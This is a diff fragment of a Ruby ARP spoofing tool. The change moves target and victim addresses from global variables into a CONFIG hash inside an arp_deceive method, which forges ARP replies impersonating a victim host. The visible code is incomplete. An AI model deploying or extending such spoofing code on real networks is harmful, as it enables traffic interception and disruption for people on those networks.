@@ -2,19 +2,19 @@ require_relative '../../protocol/arp_pac.rb'
 
 class ARPP
 	def self.arp_deceive(pcap, redo_time=1, scale=1)
-		target_ip = arr_to_dot_dec($dst_ip)
-		victim_ip = arr_to_dot_dec($victim_ip) #被冒充的主机的ip
+		target_ip = arr_to_dot_dec(CONFIG[:dst_ip])
+		victim_ip = arr_to_dot_dec(CONFIG[:victim_ip]) #被冒充的主机的ip
 		pcap.set_filter("arp and dst host #{victim_ip}") #抓那些询问谁是victim_ip的arp报文
 
 		deceive_pac = ARPP.new
 		deceive_pac.instance_eval do
 			@arph.opcode = 2
-			# @arph.set_mac_by_str($src_mac, :sender)
-			@arph.set_addr_by_arr($victim_ip, :sender)
-			@arph.set_mac_by_str($dst_mac, :receiver)
-			@arph.set_addr_by_arr($dst_ip, :receiver)
+			# @arph.set_mac_by_str(CONFIG[:src_mac], :sender)
+			@arph.set_addr_by_arr(CONFIG[:victim_ip], :sender)
+			@arph.set_mac_by_str(CONFIG[:dst_mac], :receiver)
+			@arph.set_addr_by_arr(CONFIG[:dst_ip], :receiver)
 
-			@etherh.dst_mac = $dst_mac
+			@etherh.dst_mac = CONFIG[:dst_mac]
 		end
 		deceive_pac.renew
 
